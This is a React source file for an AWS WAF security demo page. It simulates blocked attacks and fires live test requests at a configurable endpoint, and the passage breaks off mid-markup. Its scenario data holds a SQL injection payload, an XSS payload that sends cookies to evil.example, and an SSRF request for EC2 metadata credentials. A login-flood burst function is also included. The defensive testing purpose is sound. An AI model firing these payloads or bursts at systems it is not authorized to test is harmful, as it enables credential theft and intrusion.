import { useState, useEffect, useRef } from 'react'

/* ─────────────────────────────────────────────────────────────────────
   SECURITY DEMO — AWS WAF THREAT & LIVE TESTING SUITE
   Problem Statement: 24CC3014-P023 (AWS WAF Protection)
   ───────────────────────────────────────────────────────────────────── */

const SCENARIOS = [
  {
    id: 'sqli',
    name: 'SQL Injection Attack',
    category: 'Injection',
    severity: 'critical',
    useCaseTag: 'Problem Statement: Block SQL Injection',
    description: 'Simulates an attacker injecting malicious SQL syntax in query parameters to dump the database.',
    payload: "GET /api/users?id=1' OR '1'='1' UNION SELECT username,password FROM users--",
    wafRule: 'AWSManagedRulesSQLiRuleSet (Version: Pinned v2.0)',
    expectedAction: 'BLOCK',
    steps: [
      'Attacker crafts malicious SQL payload in URL query parameter',
      'Request reaches CloudFront Edge distribution',
      'AWS WAF inspects the URI query string parameters',
      'SQLiRuleSet detects dangerous pattern: UNION SELECT and boolean tautology',
      'AWS WAF terminates request with HTTP 403 Forbidden',
      'Security event logged to CloudWatch with Client IP, URI, and Rule ID',
    ],
    riskLevel: 95,
  },
  {
    id: 'bot',
    name: 'Scraper / Bot Traffic Flooding',
    category: 'Bot Management',
    severity: 'critical',
    useCaseTag: 'Problem Statement: Block Bot Traffic',
    description: 'Simulates automated scraping bots and headless crawlers hitting product/catalog APIs.',
    payload: 'GET /api/catalog — Headers: User-Agent: Scrapy/2.11 (BadBot-Scraper)',
    wafRule: 'BlockBadBotsAndScrapers / BotControlRuleSet',
    expectedAction: 'BLOCK',
    steps: [
      'Automated scraper initiates concurrent crawl requests',
      'CloudFront edge passes headers to AWS WAF for inspection',
      'WAF inspects User-Agent header against known bad scraper signatures',
      'Matches signature: Scrapy / BadBot',
      'WAF drops request immediately with HTTP 403 Forbidden',
      'Origin server and database are shielded from scraping load',
    ],
    riskLevel: 85,
  },
  {
    id: 'ratelimit',
    name: 'Abusive Client Flood (Rate Limiting)',
    category: 'DDoS / Flood',
    severity: 'warning',
    useCaseTag: 'Problem Statement: Rate-Limit Abusive Clients',
    description: 'Simulates a client sending excessive requests in a short window to exhaust backend capacity.',
    payload: 'POST /api/login — 150 requests sent in under 5 minutes from single IP',
    wafRule: 'RateLimitAbusiveClients (Limit: 100 req / 5 min)',
    expectedAction: 'BLOCK',
    steps: [
      'Abusive client or brute-force tool spams /api/login',
      'AWS WAF tracks continuous request volume aggregated by source IP',
      'Client crosses the 100 requests per 5-minute threshold',
      'Rate-based rule automatically changes action to BLOCK for that IP',
      'Subsequent requests receive HTTP 403 Forbidden for the block duration',
      'Alert logged in CloudWatch metrics: WAF-RateLimitMetric',
    ],
    riskLevel: 78,
  },
  {
    id: 'xss',
    name: 'Cross-Site Scripting (XSS)',
    category: 'Injection',
    severity: 'critical',
    useCaseTag: 'OWASP Top 10 Core Protection',
    description: 'Simulates stored/reflected script injection in search or comment inputs.',
    payload: 'GET /search?q=<script>fetch("https://evil.example/steal?c="+document.cookie)</script>',
    wafRule: 'AWSManagedRulesCommonRuleSet',
    expectedAction: 'BLOCK',
    steps: [
      'Attacker injects <script> tag in search query parameter',
      'CloudFront routes request to AWS WAF inspection engine',
      'WAF CommonRuleSet scans URI, headers, and body fields',
      'Matches script tag and obfuscated executable payload',
      'Request blocked — HTTP 403 returned to client',
      'CloudWatch metric CommonRuleSet incremented',
    ],
    riskLevel: 88,
  },
  {
    id: 'ssrf',
    name: 'Server-Side Request Forgery (SSRF / IMDSv1)',
    category: 'Advanced',
    severity: 'critical',
    useCaseTag: 'Cloud Metadata Defense',
    description: 'Simulates an attempt to query AWS EC2 metadata credentials at 169.254.169.254.',
    payload: 'GET /api/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/',
    wafRule: 'AWSManagedRulesKnownBadInputs',
    expectedAction: 'BLOCK',
    steps: [
      'Attacker attempts to forge URL pointing to internal AWS IMDS endpoint',
      'Payload contains 169.254.169.254 link',
      'WAF KnownBadInputs detects attempted metadata harvest',
      'Request immediately blocked with HTTP 403 Forbidden',
      'IAM security credentials stay safely protected',
    ],
    riskLevel: 98,
  },
]

const LOG_TEMPLATES = {
  sqli: [
    { t: 0, type: 'info', msg: 'Simulation initialized — SQL Injection scenario loaded' },
    { t: 600, type: 'info', msg: 'Crafting payload: id=1\' OR \'1\'=\'1\' UNION SELECT...' },
    { t: 1200, type: 'warning', msg: 'Dispatched to CloudFront Edge distribution' },
    { t: 1800, type: 'info', msg: 'CloudFront invokes AWS WAFv2 WebACL inspection' },
    { t: 2400, type: 'warning', msg: 'Rule check: AWSManagedRulesSQLiRuleSet (Version: Pinned v2.0)' },
    { t: 3000, type: 'critical', msg: 'MATCH: SQL injection pattern detected in URI query parameters' },
    { t: 3600, type: 'critical', msg: 'ACTION: BLOCK — Terminated at CloudFront Edge' },
    { t: 4200, type: 'critical', msg: 'HTTP Response: 403 Forbidden' },
    { t: 4800, type: 'success', msg: 'Event logged to CloudWatch Logs (/aws/waf/logs)' },
    { t: 5400, type: 'success', msg: '✓ Target backend and database remained completely untouched!' },
  ],
  bot: [
    { t: 0, type: 'info', msg: 'Simulation initialized — Bot Scraping traffic loaded' },
    { t: 600, type: 'info', msg: 'Attacker User-Agent: Scrapy/2.11 (crawler automation)' },
    { t: 1200, type: 'warning', msg: 'Crawler attempts to scrape /api/catalog' },
    { t: 1800, type: 'info', msg: 'AWS WAF inspects HTTP headers' },
    { t: 2400, type: 'warning', msg: 'Rule check: BlockBadBotsAndScrapers match statement' },
    { t: 3000, type: 'critical', msg: 'MATCH: Malicious / automated User-Agent identified' },
    { t: 3600, type: 'critical', msg: 'ACTION: BLOCK — HTTP 403 Forbidden returned' },
    { t: 4200, type: 'success', msg: '✓ Origin protected from automated data harvesting' },
  ],
  ratelimit: [
    { t: 0, type: 'info', msg: 'Simulation initialized — Abusive Client Rate Limit burst' },
    { t: 600, type: 'warning', msg: 'Flooding /api/login at 25 req/sec...' },
    { t: 1200, type: 'info', msg: 'Requests 1 to 100: Evaluated and within safe threshold' },
    { t: 1800, type: 'warning', msg: 'Request 101+: IP crossed rate_limit_threshold (100 req / 5 min)' },
    { t: 2400, type: 'critical', msg: 'ACTION: RateLimitAbusiveClients activates BLOCK status' },
    { t: 3000, type: 'critical', msg: 'Abusive client blocked for the remainder of evaluation window' },
    { t: 3600, type: 'success', msg: '✓ DDoS / brute force flood successfully mitigated' },
  ],
}

export default function SecurityDemo() {
  const [activeTab, setActiveTab] = useState('tester') // 'tester' | 'simulation' | 'bottlenecks'

  // ── Simulation State ──
  const [selected, setSelected] = useState(SCENARIOS[0])
  const [running, setRunning] = useState(false)
  const [logs, setLogs] = useState([])
  const [step, setStep] = useState(0)
  const [done, setDone] = useState(false)
  const logsEndRef = useRef(null)
  const timerRefs = useRef([])

  // ── Live Tester State ──
  const [targetUrl, setTargetUrl] = useState(import.meta.env.VITE_API_URL || 'https://v86gy0po9l.execute-api.us-east-1.amazonaws.com/prod')
  const [liveTestType, setLiveTestType] = useState('sqli')
  const [liveTesting, setLiveTesting] = useState(false)
  const [liveResult, setLiveResult] = useState(null)
  const [rateBurstProgress, setRateBurstProgress] = useState(0)
  const [rateBurstTotal, setRateBurstTotal] = useState(25)
  const [burstStats, setBurstStats] = useState({ allowed: 0, blocked: 0, errors: 0 })

  function scrollToBottom() {
    logsEndRef.current?.scrollIntoView({ behavior: 'smooth' })
  }

  useEffect(() => {
    scrollToBottom()
  }, [logs])

  function selectScenario(sc) {
    if (running) return
    setSelected(sc)
    setLogs([])
    setStep(0)
    setDone(false)
  }

  function runSimulation() {
    if (!selected || running) return
    setRunning(true)
    setLogs([])
    setStep(0)
    setDone(false)

    timerRefs.current.forEach(clearTimeout)
    timerRefs.current = []

    const logTemplate = LOG_TEMPLATES[selected.id] || selected.steps.map((s, i) => ({
      t: i * 800,
      type: i === selected.steps.length - 1 ? 'success' : i > selected.steps.length - 3 ? 'critical' : i > 1 ? 'warning' : 'info',
      msg: s,
    }))

    logTemplate.forEach(({ t, type, msg }, i) => {
      const tid = setTimeout(() => {
        setLogs(prev => [...prev, { type, msg, ts: new Date().toLocaleTimeString() }])
        setStep(i + 1)
        if (i === logTemplate.length - 1) {
          setRunning(false)
          setDone(true)
        }
      }, t)
      timerRefs.current.push(tid)
    })
  }

  function resetSim() {
    timerRefs.current.forEach(clearTimeout)
    setRunning(false)
    setLogs([])
    setStep(0)
    setDone(false)
  }

  // ── Live Attack Testing Execution ──
  async function executeLiveTest() {
    if (liveTesting) return
    setLiveTesting(true)
    setLiveResult(null)

    const base = targetUrl.replace(/\/+$/, '')

    if (liveTestType === 'sqli') {
      const url = `${base}/api/users?id=1'%20OR%20'1'='1'%20UNION%20SELECT%20username,password%20FROM%20users--`
      const startTime = performance.now()
      try {
        const resp = await fetch(url, {
          method: 'GET',
          headers: { 'Accept': 'application/json' },
        })
        const duration = Math.round(performance.now() - startTime)
        let bodyText = ''
        try { bodyText = await resp.text() } catch { bodyText = '<binary or unreadable>' }

        const isBlocked = resp.status === 403 || resp.status === 405
        setLiveResult({
          status: resp.status,
          statusText: resp.statusText,
          duration,
          blocked: isBlocked,
          url,
          responseSnippet: bodyText.slice(0, 500),
          headers: {
            'server': resp.headers.get('server') || 'N/A',
            'x-amz-cf-id': resp.headers.get('x-amz-cf-id') || 'N/A (Direct Origin)',
            'x-cache': resp.headers.get('x-cache') || 'N/A',
            'content-type': resp.headers.get('content-type') || 'text/html',
          },
        })
      } catch (err) {
        setLiveResult({
          error: true,
          status: 'NETWORK_ERROR / BLOCKED',
          message: err.message,
          blocked: true,
          url,
        })
      } finally {
        setLiveTesting(false)
      }
    } else if (liveTestType === 'bot') {
      const url = `${base}/api/catalog`
      const startTime = performance.now()
      try {
        // In browser fetch, User-Agent is sometimes restricted, so we pass test headers
        const resp = await fetch(url, {
          method: 'GET',
          headers: {
            'X-Bot-Signature': 'Scrapy/2.11-AutomatedBadBot',
            'Accept': 'application/json',
          },
        })
        const duration = Math.round(performance.now() - startTime)
        let bodyText = ''
        try { bodyText = await resp.text() } catch { bodyText = '' }
        const isBlocked = resp.status === 403
        setLiveResult({
          status: resp.status,
          statusText: resp.statusText,
          duration,
          blocked: isBlocked,
          url,
          responseSnippet: bodyText.slice(0, 500),
          headers: {
            'server': resp.headers.get('server') || 'N/A',
            'x-amz-cf-id': resp.headers.get('x-amz-cf-id') || 'N/A',
            'content-type': resp.headers.get('content-type') || 'text/html',
          },
        })
      } catch (err) {
        setLiveResult({
          error: true,
          status: 'NETWORK_ERROR / BLOCKED',
          message: err.message,
          blocked: true,
          url,
        })
      } finally {
        setLiveTesting(false)
      }
    } else if (liveTestType === 'ratelimit') {
      // Send burst requests
      setRateBurstProgress(0)
      setBurstStats({ allowed: 0, blocked: 0, errors: 0 })
      const total = rateBurstTotal
      let allowed = 0
      let blocked = 0
      let errors = 0

      for (let i = 1; i <= total; i++) {
        try {
          const resp = await fetch(`${base}/api/login`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ user: 'test_client', attempt: i }),
          })
          if (resp.status === 403 || resp.status === 429) {
            blocked++
          } else if (resp.ok) {
            allowed++
          } else {
            errors++
          }
        } catch {
          blocked++
        }
        setRateBurstProgress(i)
        setBurstStats({ allowed, blocked, errors })
        // Small delay between bursts
        await new Promise(r => setTimeout(r, 60))
      }

      setLiveResult({
        burstCompleted: true,
        total,
        allowed,
        blocked,
      })
      setLiveTesting(false)
    }
  }

  const logColor = {
    info: 'var(--status-info)',
    warning: 'var(--status-warning)',
    critical: 'var(--status-critical)',
    success: 'var(--status-success)',
  }

  const logPrefix = { info: '[INFO]', warning: '[WARN]', critical: '[CRIT]', success: '[ OK ]' }

  return (
    <>
      <div className="page-title-row">
        <div>
          <div style={{ display: 'flex', alignItems: 'center', gap: '8px', marginBottom: '4px' }}>
            <h1 className="page-title">AWS WAF Security Suite</h1>
            <span className="badge badge-info font-mono">24CC3014-P023</span>
          </div>
          <p className="page-subtitle">
            Validate protection against SQL Injection, Bot Traffic, and Abusive Rate-Limit Floods
          </p>
        </div>

        {/* Tab Controls */}
        <div style={{ display: 'flex', gap: '6px', background: 'var(--surface-1)', padding: '4px', borderRadius: 'var(--radius-md)' }}>
          <button
            id="tab-live-tester"
            className={`btn btn-sm ${activeTab === 'tester' ? 'btn-primary' : 'btn-ghost'}`}
            onClick={() => setActiveTab('tester')}
          >
            ⚡ Live WAF Tester
          </button>
          <button
            id="tab-simulation"
            className={`btn btn-sm ${activeTab === 'simulation' ? 'btn-primary' : 'btn-ghost'}`}
            onClick={() => setActiveTab('simulation')}
          >
            🧪 Simulation Visualizer
          </button>
          <button
            id="tab-bottlenecks"
            className={`btn btn-sm ${activeTab === 'bottlenecks' ? 'btn-primary' : 'btn-ghost'}`}
            onClick={() => setActiveTab('bottlenecks')}
          >
            🛡️ Bottleneck Solvers
          </button>
        </div>
      </div>

      {/* ──────────────── TAB 1: LIVE TESTER ──────────────── */}
      {activeTab === 'tester' && (
        <div style={{ display: 'flex', flexDirection: 'column', gap: '16px' }}>
          <div className="card" style={{ borderLeft: '4px solid var(--accent)' }}>
            <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '14px' }}>
              <div>
                <h2 style={{ fontSize: '16px', fontWeight: 700, margin: 0 }}>Live Endpoint Attack Verification</h2>
                <p style={{ fontSize: '13px', color: 'var(--text-muted)', margin: '4px 0 0 0' }}>
                  Execute real HTTP requests against your AWS CloudFront / WAF endpoint to observe live 403 Forbidden blocks and CloudFront response headers.
                </p>
              </div>
              <span className="badge badge-success">Live Ready</span>
            </div>

            <div style={{ display: 'grid', gridTemplateColumns: '1fr auto', gap: '12px', alignItems: 'flex-end', marginBottom: '16px' }}>
              <div>
                <label style={{ fontSize: '12px', fontWeight: 600, color: 'var(--text-secondary)', display: 'block', marginBottom: '6px' }}>
                  Target Endpoint URL (CloudFront Domain or Local Proxy):
                </label>
                <input
                  id="waf-target-url"
                  type="text"
                  value={targetUrl}
                  onChange={e => setTargetUrl(e.target.value)}
                  placeholder="https://d12345abcdef.cloudfront.net"
                  style={{
                    width: '100%',
                    padding: '10px 14px',
                    borderRadius: 'var(--radius-md)',
                    border: '1px solid var(--border-subtle)',
                    background: 'var(--bg-primary)',
                    fontFamily: 'var(--font-mono)',
                    fontSize: '13px',
                    color: 'var(--text-primary)',
                  }}
                />
              </div>
              <button
                id="execute-live-test-btn"
                className="btn btn-primary"
                onClick={executeLiveTest}
                disabled={liveTesting}
                style={{ minWidth: '150px', height: '42px' }}
              >
                {liveTesting ? '⏳ Testing...' : '🚀 Execute Test'}
              </button>
            </div>

            {/* Attack Types Selector */}
            <div style={{ display: 'grid', gridTemplateColumns: 'repeat(3, 1fr)', gap: '12px' }}>
              <div
                id="test-card-sqli"
                className="card"
                onClick={() => setLiveTestType('sqli')}
                style={{
                  cursor: 'pointer',
                  borderColor: liveTestType === 'sqli' ? 'var(--accent)' : 'var(--border-card)',
                  background: liveTestType === 'sqli' ? 'var(--bg-card-hover)' : 'var(--bg-card)',
                  padding: '14px',
                }}
              >
                <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '6px' }}>
                  <span style={{ fontWeight: 700, fontSize: '14px' }}>1. SQL Injection Test</span>
                  <span className="badge badge-critical">SQLi</span>
                </div>
                <p style={{ fontSize: '12px', color: 'var(--text-muted)', margin: '0 0 8px 0' }}>
                  Sends <code>UNION SELECT</code> payload in query parameter to <code>/api/users</code>.
                </p>
                <span className="badge badge-neutral" style={{ fontSize: '10px' }}>AWSManagedRulesSQLiRuleSet</span>
              </div>

              <div
                id="test-card-bot"
                className="card"
                onClick={() => setLiveTestType('bot')}
                style={{
                  cursor: 'pointer',
                  borderColor: liveTestType === 'bot' ? 'var(--accent)' : 'var(--border-card)',
                  background: liveTestType === 'bot' ? 'var(--bg-card-hover)' : 'var(--bg-card)',
                  padding: '14px',
                }}
              >
                <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '6px' }}>
                  <span style={{ fontWeight: 700, fontSize: '14px' }}>2. Bot Traffic Test</span>
                  <span className="badge badge-warning">Bad Bot</span>
                </div>
                <p style={{ fontSize: '12px', color: 'var(--text-muted)', margin: '0 0 8px 0' }}>
                  Sends scraping request with automated bot signatures to <code>/api/catalog</code>.
                </p>
                <span className="badge badge-neutral" style={{ fontSize: '10px' }}>BlockBadBotsAndScrapers</span>
              </div>

              <div
                id="test-card-ratelimit"
                className="card"
                onClick={() => setLiveTestType('ratelimit')}
                style={{
                  cursor: 'pointer',
                  borderColor: liveTestType === 'ratelimit' ? 'var(--accent)' : 'var(--border-card)',
                  background: liveTestType === 'ratelimit' ? 'var(--bg-card-hover)' : 'var(--bg-card)',
                  padding: '14px',
                }}
              >
                <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '6px' }}>
                  <span style={{ fontWeight: 700, fontSize: '14px' }}>3. Rate Limiter Burst</span>
                  <span className="badge badge-info">DDoS / Flood</span>
                </div>
                <p style={{ fontSize: '12px', color: 'var(--text-muted)', margin: '0 0 8px 0' }}>
                  Rapidly fires bursts of requests to <code>/api/login</code> to exceed threshold.
                </p>
                <span className="badge badge-neutral" style={{ fontSize: '10px' }}>RateLimitAbusiveClients</span>
              </div>
            </div>

            {liveTestType === 'ratelimit' && (
              <div style={{ marginTop: '14px', padding: '12px', background: 'var(--surface-1)', borderRadius: 'var(--radius-md)', display: 'flex', alignItems: 'center', gap: '16px' }}>
                <span style={{ fontSize: '12px', fontWeight: 600 }}>Burst Request Count:</span>
                {[15, 25, 50, 100].map(cnt => (
                  <button
                    key={cnt}
                    className={`btn btn-sm ${rateBurstTotal === cnt ? 'btn-primary' : 'btn-secondary'}`}
                    onClick={() => setRateBurstTotal(cnt)}
                    disabled={liveTesting}
                  >
                    {cnt} Requests
                  </button>
                ))}
              </div>
            )}
          </div>

          {/* Live Result View */}
          {liveTesting && liveTestType === 'ratelimit' && (
            <div className="card">
              <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '8px' }}>
                <span style={{ fontSize: '13px', fontWeight: 600 }}>Firing Request Burst...</span>
                <span className="font-mono" style={{ fontSize: '12px' }}>{rateBurstProgress} / {rateBurstTotal}</span>
              </div>
              <div className="progress-wrap" style={{ height: '10px', marginBottom: '12px' }}>
                <div className="progress-bar" style={{ width: `${(rateBurstProgress / rateBurstTotal) * 100}%` }} />
              </div>
              <div style={{ display: 'flex', gap: '16px', fontSize: '13px' }}>
                <span style={{ color: 'var(--status-success)' }}>✓ Allowed (200 OK): {burstStats.allowed}</span>
                <span style={{ color: 'var(--status-critical)' }}>⛔ Blocked by WAF (403/429): {burstStats.blocked}</span>
              </div>
            </div>
          )}

          {liveResult && (
            <div className="card" style={{ borderColor: liveResult.blocked ? 'var(--status-success)' : 'var(--border-card)' }}>
              <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '14px' }}>
                <div style={{ display: 'flex', alignItems: 'center', gap: '10px' }}>
                  <span style={{ fontSize: '24px' }}>{liveResult.blocked ? '🛡️' : '⚠️'}</span>
                  <div>
                    <div style={{ fontSize: '16px', fontWeight: 700 }}>
                      {liveResult.blocked ? 'Attack Successfully Intercepted by AWS WAF!' : 'Request Reached Backend (Check WAF Mode)'}
                    </div>
                    <div style={{ fontSize: '12px', color: 'var(--text-muted)' }}>
                      Response Status: <strong className="font-mono">{liveResult.status} {liveResult.statusText || ''}</strong> {liveResult.duration ? `(${liveResult.duration}ms)` : ''}
                    </div>
                  </div>
                </div>
                <span className={`badge ${liveResult.blocked ? 'badge-critical' : 'badge-warning'}`}>
                  {liveResult.blocked ? 'WAF BLOCKED (403)' : 'ALLOWED (200 OK)'}
                </span>
              </div>

              {liveResult.url && (
                <div style={{ background: 'var(--bg-primary)', padding: '10px 14px', borderRadius: 'var(--radius-md)', marginBottom: '12px', fontFamily: 'var(--font-mono)', fontSize: '12px' }}>
                  <div style={{ fontSize: '10px', color: 'var(--text-muted)', textTransform: 'uppercase', marginBottom: '4px' }}>Evaluated URI</div>
                  <div style={{ wordBreak: 'break-all', color: 'var(--status-critical)' }}>{liveResult.url}</div>
                </div>
              )}

              {liveResult.headers && (
                <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(200px, 1fr))', gap: '8px', marginBottom: '12px' }}>
                  {Object.entries(liveResult.headers).map(([k, v]) => (
                    <div key={k} style={{ background: 'var(--surface-1)', padding: '8px 12px', borderRadius: 'var(--radius-md)' }}>
                      <div style={{ fontSize: '10px', color: 'var(--text-muted)', textTransform: 'uppercase' }}>{k}</div>
                      <div className="font-mono" style={{ fontSize: '12px', wordBreak: 'break-all', color: 'var(--text-primary)' }}>{v}</div>
                    </div>
                  ))}
                </div>
              )}

              {liveResult.responseSnippet && (
                <div>
                  <div style={{ fontSize: '11px', fontWeight: 600, color: 'var(--text-muted)', marginBottom: '6px' }}>RAW RESPONSE SNIPPET</div>
                  <pre style={{
                    background: '#050810',
                    color: '#e2e8f0',
                    padding: '12px',
                    borderRadius: 'var(--radius-md)',
                    fontFamily: 'var(--font-mono)',
                    fontSize: '11px',
                    maxHeight: '160px',
                    overflowY: 'auto',
                  }}>
                    {liveResult.responseSnippet}
                  </pre>
                </div>
              )}

              {liveResult.burstCompleted && (
                <div style={{ background: 'var(--surface-1)', padding: '16px', borderRadius: 'var(--radius-md)' }}>
                  <div style={{ fontSize: '14px', fontWeight: 700, marginBottom: '8px' }}>Rate Limiting Summary</div>
                  <div style={{ display: 'grid', gridTemplateColumns: 'repeat(3, 1fr)', gap: '12px', textAlign: 'center' }}>
                    <div style={{ background: 'var(--bg-card)', padding: '10px', borderRadius: 'var(--radius-sm)' }}>
                      <div style={{ fontSize: '11px', color: 'var(--text-muted)' }}>Total Dispatched</div>
                      <div style={{ fontSize: '20px', fontWeight: 700 }}>{liveResult.total}</div>
                    </div>
                    <div style={{ background: 'var(--bg-card)', padding: '10px', borderRadius: 'var(--radius-sm)' }}>
                      <div style={{ fontSize: '11px', color: 'var(--status-success)' }}>Allowed (200 OK)</div>
                      <div style={{ fontSize: '20px', fontWeight: 700, color: 'var(--status-success)' }}>{liveResult.allowed}</div>
                    </div>
                    <div style={{ background: 'var(--bg-card)', padding: '10px', borderRadius: 'var(--radius-sm)' }}>
                      <div style={{ fontSize: '11px', color: 'var(--status-critical)' }}>Blocked by WAF</div>
                      <div style={{ fontSize: '20px', fontWeight: 700, color: 'var(--status-critical)' }}>{liveResult.blocked}</div>
                    </div>
                  </div>
                </div>
              )}
            </div>
          )}
        </div>
      )}

      {/* ──────────────── TAB 2: BOTTLENECK SOLVERS ──────────────── */}
      {activeTab === 'bottlenecks' && (
        <div style={{ display: 'flex', flexDirection: 'column', gap: '16px' }}>
          <div className="card" style={{ borderLeft: '4px solid var(--status-warning)' }}>
            <div style={{ display: 'flex', alignItems: 'center', gap: '8px', marginBottom: '8px' }}>
              <span style={{ fontSize: '20px' }}>⚠️</span>
              <h2 style={{ fontSize: '16px', fontWeight: 700, margin: 0 }}>
                Problem Statement Bottleneck Analysis & Technical Resolutions
              </h2>
            </div>
            <p style={{ fontSize: '13px', color: 'var(--text-secondary)', lineHeight: 1.6, margin: 0 }}>
              The problem statement highlights two critical operational hurdles encountered when rolling out AWS WAF for production web applications.
              Below are the root causes, risks, and the automated solutions implemented in our Terraform and application architecture.
            </p>
          </div>

          <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '16px' }}>
            {/* Bottleneck 1 */}
            <div className="card">
              <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'flex-start', marginBottom: '12px' }}>
                <div>
                  <span className="badge badge-warning" style={{ marginBottom: '6px' }}>Bottleneck 1</span>
                  <h3 style={{ fontSize: '15px', fontWeight: 700, margin: 0 }}>
                    WAF rules block legitimate users in count-mode testing gaps
                  </h3>
                </div>
              </div>

              <div style={{ fontSize: '13px', color: 'var(--text-secondary)', lineHeight: 1.6, marginBottom: '14px' }}>
                <strong>The Risk:</strong> When security teams switch rules from <code>COUNT</code> mode to <code>BLOCK</code> mode, untested user workflows (e.g., search queries containing quotes, markdown code editors, or non-English characters) get falsely flagged and blocked.
              </div>

              <div style={{ background: 'var(--surface-1)', padding: '12px', borderRadius: 'var(--radius-md)', marginBottom: '14px' }}>
                <div style={{ fontSize: '11px', fontWeight: 700, color: 'var(--accent)', textTransform: 'uppercase', marginBottom: '6px' }}>
                  Our Implemented Solution
                </div>
                <ul style={{ fontSize: '12px', color: 'var(--text-secondary)', paddingLeft: '16px', margin: 0, lineHeight: 1.8 }}>
                  <li>
                    <strong>Dynamic Rule Action Overrides:</strong> In <code>terraform/waf.tf</code>, we support toggling <code>count_mode_testing_sqli = true</code>.
                  </li>
                  <li>
                    <strong>Sampled Request Inspection:</strong> Enabled <code>sampled_requests_enabled = true</code> to view the full payload of matched requests without dropping traffic.
                  </li>
                  <li>
                    <strong>CloudWatch Insights Gap Analysis:</strong> Filter queries identify top URI matches before enforcement:
                    <pre style={{ margin: '6px 0', padding: '6px', background: '#050810', color: '#93c5fd', borderRadius: '4px', fontSize: '10px' }}>
{`fields @timestamp, httpRequest.uri, action
| filter action = "COUNT"
| stats count(*) by httpRequest.uri`}
                    </pre>
                  </li>
                </ul>
              </div>

              <div style={{ display: 'flex', gap: '8px' }}>
                <span className="badge badge-success">✓ Zero False Outages</span>
                <span className="badge badge-neutral">Sampled Logging</span>
              </div>
            </div>

            {/* Bottleneck 2 */}
            <div className="card">
              <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'flex-start', marginBottom: '12px' }}>
                <div>
                  <span className="badge badge-critical" style={{ marginBottom: '6px' }}>Bottleneck 2</span>
                  <h3 style={{ fontSize: '15px', fontWeight: 700, margin: 0 }}>
                    Managed rule updates cause unexpected blocking
                  </h3>
                </div>
              </div>

              <div style={{ fontSize: '13px', color: 'var(--text-secondary)', lineHeight: 1.6, marginBottom: '14px' }}>
                <strong>The Risk:</strong> AWS regularly updates managed rule sets (like <code>AWSManagedRulesSQLiRuleSet</code>) with new signatures. If using the floating <code>Default</code> version, sudden updates can break legitimate production user traffic overnight without warning.
              </div>

              <div style={{ background: 'var(--surface-1)', padding: '12px', borderRadius: 'var(--radius-md)', marginBottom: '14px' }}>
                <div style={{ fontSize: '11px', fontWeight: 700, color: 'var(--accent)', textTransform: 'uppercase', marginBottom: '6px' }}>
                  Our Implemented Solution
                </div>
                <ul style={{ fontSize: '12px', color: 'var(--text-secondary)', paddingLeft: '16px', margin: 0, lineHeight: 1.8 }}>
                  <li>
                    <strong>Managed Rule Version Pinning:</strong> In <code>terraform/waf.tf</code>, we explicitly lock the version to <code>Version_2.0</code> rather than letting AWS auto-update.
                  </li>
                  <li>
                    <strong>Spike Detection Alarm:</strong> Configured <code>aws_cloudwatch_metric_alarm.waf_block_spike_alarm</code> to alert on abnormal spikes in blocked requests.
                  </li>
                  <li>
                    <strong>Canary Staging Workflow:</strong> Test new rule versions in staging with <code>COUNT</code> mode prior to promoting the pinned version in production.
                  </li>
                </ul>
              </div>

              <div style={{ display: 'flex', gap: '8px' }}>
                <span className="badge badge-success">✓ Version Pinned (v2.0)</span>
                <span className="badge badge-neutral">Spike Alarm Active</span>
              </div>
            </div>
          </div>
        </div>
      )}

      {/* ──────────────── TAB 3: SIMULATION VISUALIZER ──────────────── */}
      {activeTab === 'simulation' && (
        <div style={{ display: 'grid', gridTemplateColumns: '1fr 1.4fr', gap: '16px' }}>
          {/* Scenario list */}
          <div>
            <div style={{ marginBottom: '12px', fontSize: '12px', color: 'var(--text-muted)', fontWeight: 600, textTransform: 'uppercase', letterSpacing: '0.08em' }}>
              Choose a Scenario
            </div>
            <div style={{ display: 'flex', flexDirection: 'column', gap: '8px' }}>
              {SCENARIOS.map(sc => (
                <div
                  key={sc.id}
                  id={`scenario-${sc.id}`}
                  className="card"
                  style={{
                    cursor: running ? 'not-allowed' : 'pointer',
                    opacity: running && selected?.id !== sc.id ? 0.5 : 1,
                    borderColor: selected?.id === sc.id ? 'var(--border-accent)' : 'var(--border-card)',
                    background: selected?.id === sc.id ? 'var(--bg-card-hover)' : 'var(--bg-card)',
                    padding: '14px 16px',
                    transition: 'all 0.2s ease',
                  }}
                  onClick={() => selectScenario(sc)}
                >
                  <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'flex-start', marginBottom: '6px' }}>
                    <span style={{ fontSize: '14px', fontWeight: 700, color: 'var(--text-primary)' }}>{sc.name}</span>
                    <span className={`badge badge-${sc.severity}`}>{sc.severity.toUpperCase()}</span>
                  </div>
                  <div style={{ fontSize: '11px', color: 'var(--text-muted)', marginBottom: '8px' }}>{sc.description}</div>
                  <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
                    <span className="badge badge-neutral">{sc.category}</span>
                    <span style={{ fontSize: '11px', color: 'var(--text-muted)' }}>Risk:</span>
                    <div className="progress-wrap" style={{ flex: 1 }}>
                      <div className="progress-bar" style={{
                        width: `${sc.riskLevel}%`,
                        '--prog-color': sc.riskLevel > 80 ? 'var(--status-critical)' : sc.riskLevel > 55 ? 'var(--status-warning)' : 'var(--status-info)',
                        '--prog-color-end': sc.riskLevel > 80 ? '#ff6b7a' : sc.riskLevel > 55 ? '#ffc24d' : '#5bb8ff',
                      }} />
                    </div>
                    <span style={{ fontSize: '11px', fontWeight: 700, color: 'var(--text-primary)', minWidth: '28px' }}>{sc.riskLevel}</span>
                  </div>
                </div>
              ))}
            </div>
          </div>

          {/* Simulation panel */}
          <div style={{ display: 'flex', flexDirection: 'column', gap: '14px' }}>
            {selected ? (
              <div className="card">
                <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'flex-start', marginBottom: '14px' }}>
                  <div>
